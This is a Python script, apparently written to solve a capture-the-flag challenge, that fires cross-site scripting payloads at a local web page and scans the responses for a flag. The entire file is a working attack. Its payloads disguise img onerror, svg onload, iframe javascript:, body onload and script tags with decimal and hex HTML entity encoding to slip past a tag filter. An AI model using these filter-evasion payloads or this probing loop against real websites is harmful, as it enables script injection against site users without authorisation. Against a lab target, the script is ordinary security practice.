import requests
import re

target = "http://127.0.0.1:32889/page"

# Test if script actually executes by trying img onerror as alternative
payloads = [
    # Original working pattern with different tags
    "&lt;&#105;&#109;&#103; &#115;&#114;&#99;=x &#111;&#110;&#101;&#114;&#114;&#111;&#114;=alert(1)&gt;",
    "&#x3c;&#x69;&#x6d;&#x67; &#x73;&#x72;&#x63;=x &#x6f;&#x6e;&#x65;&#x72;&#x72;&#x6f;&#x72;=alert(1)&#x3e;",
    
    # Try with svg
    "&lt;&#115;&#118;&#103; &#111;&#110;&#108;&#111;&#97;&#100;=alert(1)&gt;",
    
    # Try iframe
    "&lt;&#105;&#102;&#114;&#97;&#109;&#101; &#115;&#114;&#99;=javascript:alert(1)&gt;",
    
    # Try body tag
    "&lt;&#98;&#111;&#100;&#121; &#111;&#110;&#108;&#111;&#97;&#100;=alert(1)&gt;",
    
    # Back to script but simpler
    "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;1+1&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;",
    
    # Script with different content
    "&lt;&#115;&#99;&#114;&#105;&#112;&#116;&gt;document.write('test')&lt;/&#115;&#99;&#114;&#105;&#112;&#116;&gt;",
]

print("Testing alternative XSS vectors with HTML entity encoding...")
print("="*70)

for i, payload in enumerate(payloads, 1):
    try:
        response = requests.get(target, params={'name': payload}, timeout=5)
        
        print(f"\n[Test {i}] Payload: {payload[:60]}...")
        print(f"Status: {response.status_code} | Length: {len(response.content)} bytes")
        
        # Check for flag
        flags = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flags:
            print(f"*** FLAG FOUND: {flags[0]} ***")
            print(f"Full response:\n{response.text}")
        elif "Failed! Try again!" in response.text:
            print("→ 'Failed! Try again!' message")
        elif "Sorry, you can't use that tag" in response.text:
            print("✗ Blocked by filter")
        else:
            print("? Different response")
            # Print snippet to check
            match = re.search(r'<div class="solution-text">(.*?)</div>', response.text, re.DOTALL)
            if match:
                print(f"Solution div: {match.group(1).strip()}")
            
    except Exception as e:
        print(f"✗ ERROR: {str(e)}")

print("\n" + "="*70)

